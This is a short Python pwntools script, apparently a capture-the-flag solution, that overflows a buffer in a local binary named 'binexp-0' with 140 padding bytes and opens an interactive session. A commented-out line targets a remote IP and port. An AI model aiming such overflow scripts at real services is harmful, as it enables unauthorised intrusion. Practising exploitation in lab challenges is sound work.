#!/usr/bin/env python3
from pwn import *

elf = ELF('./binexp-0')
rop = ROP(elf)

p = elf.process()
#p = remote('54.255.190.215', 9000)

def exploit():

    padding = b'A'*140

    payload = padding

    p.sendline(payload)

    p.interactive()


def main():
	exploit()

if __name__ == "__main__":
	main()